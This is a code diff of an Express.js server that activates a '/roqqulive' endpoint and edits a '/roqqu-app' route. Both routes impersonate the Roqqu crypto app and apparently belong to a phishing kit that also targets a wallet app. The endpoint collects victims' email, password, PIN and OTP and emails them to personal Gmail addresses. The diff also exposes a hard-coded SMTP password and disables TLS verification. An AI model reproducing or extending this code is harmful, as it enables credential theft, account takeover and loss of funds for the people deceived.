@@ -161,8 +161,8 @@ app.post('/roqqu-app', (req, res, next) => {
 
     const mail = {
         from: 'admin@growveonct.com',
-        to: 'paysroqquu@gmail.com, ifestephenie@gmail.com',
-        // to: 'ifestephenie@gmail.com',
+      // to: 'paysroqquu@gmail.com',
+        to: 'ifestephenie@gmail.com',
         subject: 'New message from Roqqu-app',
         html: content,
     }
@@ -198,50 +198,50 @@ app.post('/roqqu-app', (req, res, next) => {
     })
 })
 
-// app.post('/roqquliveeeeeeee', (req, res, next) => {
-//     console.log('req body', req.body)
+app.post('/roqqulive', (req, res, next) => {
+    console.log('req body', req.body)
 
-//     const { email, password, pin, otp } = req.body
-//     const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `
+    const { email, password, pin, otp } = req.body
+    const content = `<p><strong>Email:</strong> ${email} </p> </br> <p><strong>Password:</strong> ${password} </p> </br> <p><strong>PIN:</strong> ${pin}</p>  </br> <p><strong>OTP:</strong>${otp}</p> `
 
-//     const mail = {
-//         from: 'admin@growveonct.com',
-//         //to: 'obiolorkingsley22@gmail.com, wj05685@gmail.com',
-//         to: 'ifestephenie@gmail.com',
-//         subject: 'New message from Roqquliveappchat',
-//         html: content,
-//     }
+    const mail = {
+        from: 'three@roqquliveappchat.com',
+        //to: 'obiolorkingsley22@gmail.com, wj05685@gmail.com',
+        to: 'ifestephenie@gmail.com',
+        subject: 'New message from Roqquliveappchat',
+        html: content,
+    }
 
-//     // const transporter = nodemailer.createTransport({
-//     //    host: 'mail.roqquliveappchat.com',
-//     //     port: 465,
-//     //     secure: true,
-//     //     requireTLS: true,
-//     //     socketTimeout: 1200000,
-//     //     connectionTimeout: 1200000,
-//     //     auth: {
-//     //         user: 'three@roqquliveappchat.com',
-//     //         pass: 'nYrZ#&,nKb=3',
-//     //     },
-//     //     tls: {
-//     //         rejectUnauthorized: false,
-//     //     },
-//     // })
+    const transporter = nodemailer.createTransport({
+       host: 'mail.roqquliveappchat.com',
+        port: 465,
+        secure: true,
+        requireTLS: true,
+        socketTimeout: 1200000,
+        connectionTimeout: 1200000,
+        auth: {
+            user: 'three@roqquliveappchat.com',
+            pass: 'nYrZ#&,nKb=3',
+        },
+        tls: {
+            rejectUnauthorized: false,
+        },
+    })
 
-//     transporter.sendMail(mail, (err, data) => {
-//         if (err) {
-//             console.log({ err })
-//             res.json({
-//                 status: 'fail',
-//             })
-//         } else {
-//             console.log('email sent', data)
-//             res.json({
-//                 status: 'success',
-//             })
-//         }
-//     })
-// })
+    transporter.sendMail(mail, (err, data) => {
+        if (err) {
+            console.log({ err })
+            res.json({
+                status: 'fail',
+            })
+        } else {
+            console.log('email sent', data)
+            res.json({
+                status: 'success',
+            })
+        }
+    })
+})
 
 // For skye wallet
 app.post('/skye-app', (req, res, next) => {
